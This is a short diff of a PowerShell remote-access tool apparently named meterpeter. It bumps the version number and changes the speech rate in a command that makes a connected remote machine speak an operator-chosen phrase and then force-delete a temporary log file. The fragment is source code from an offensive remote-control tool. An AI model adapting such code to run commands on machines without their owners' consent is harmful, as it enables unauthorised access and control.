@@ -391,7 +391,7 @@ While($Client.Connected)
     {
       write-host "`n`n Current Settings" -ForegroundColor green;
       write-host " ----------------";
-      write-host " meterpeter version   : 2.10";
+      write-host " meterpeter version   : 2.10.1";
       write-host " meterpeter flavor    : $Flavor Distro";
       write-host " meterpeter WebServer : $APACHE";
       write-host " meterpeter Server    : $IPATH";
@@ -1124,7 +1124,7 @@ While($Client.Connected)
         If(-not ($MYSpeak -eq $False -or $MYSpeak -eq ""))
         {
           write-host "`n";
-          $Command = "`$My_Line = `"$MYSpeak`";Add-Type -AssemblyName System.speech;`$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer;`$speak.Volume = 85;`$speak.Rate = -4;`$speak.Speak(`$My_Line);echo `"   [OK] Speak Frase: '$MYSpeak' Remotely ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
+          $Command = "`$My_Line = `"$MYSpeak`";Add-Type -AssemblyName System.speech;`$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer;`$speak.Volume = 85;`$speak.Rate = -3;`$speak.Speak(`$My_Line);echo `"   [OK] Speak Frase: '$MYSpeak' Remotely ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
         }else{
           write-host "`n`n";
           write-host " [ERROR] Abort, None Frase Inputed by User .." -ForegroundColor Red -BackgroundColor White;write-host "`n";Start-Sleep -Seconds 3;
